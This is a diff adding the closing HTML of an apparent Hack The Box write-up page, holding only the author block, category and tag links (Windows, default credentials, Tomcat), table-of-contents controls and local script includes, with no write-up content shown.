+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-06-12</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#DefaultCredentials</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#Tomcat</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
